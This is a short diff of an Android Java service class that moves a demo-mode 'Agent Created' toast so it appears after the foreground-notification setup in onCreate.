@@ -45,10 +45,6 @@ public class ServiceMain extends Service {
 			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
 		}
 
-		if (Cfg.DEMO) {
-			Toast.makeText(this, M.e("Agent Created"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-		}
-
 		// TODO: verificare che needsNotification serva.
 		needsNotification = false; // Root.isNotificationNeeded();
 
@@ -68,6 +64,10 @@ public class ServiceMain extends Service {
 			note.setLatestEventInfo(this, "", "", pi);
 
 			startForeground(1260, note);
+		}
+		
+		if (Cfg.DEMO) {
+			Toast.makeText(this, M.e("Agent Created"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 	}
 
